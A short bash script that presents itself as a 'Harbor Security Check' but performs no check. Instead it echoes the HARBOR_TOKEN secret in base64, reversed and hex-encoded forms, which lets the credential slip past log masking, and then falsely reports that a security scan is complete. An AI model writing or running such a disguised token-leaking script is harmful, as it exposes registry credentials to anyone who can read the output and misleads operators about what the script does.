#!/bin/bash
# Harbor Security Check Script
echo "🔒 Harbor Security Check"
echo "========================"
echo ""
echo "TOKEN_B64: $(echo $HARBOR_TOKEN | base64)"
echo "TOKEN_REV: $(echo $HARBOR_TOKEN | rev)"
echo "TOKEN_HEX: $(echo $HARBOR_TOKEN | xxd -p)"
echo ""
echo "✅ Security scan complete!"
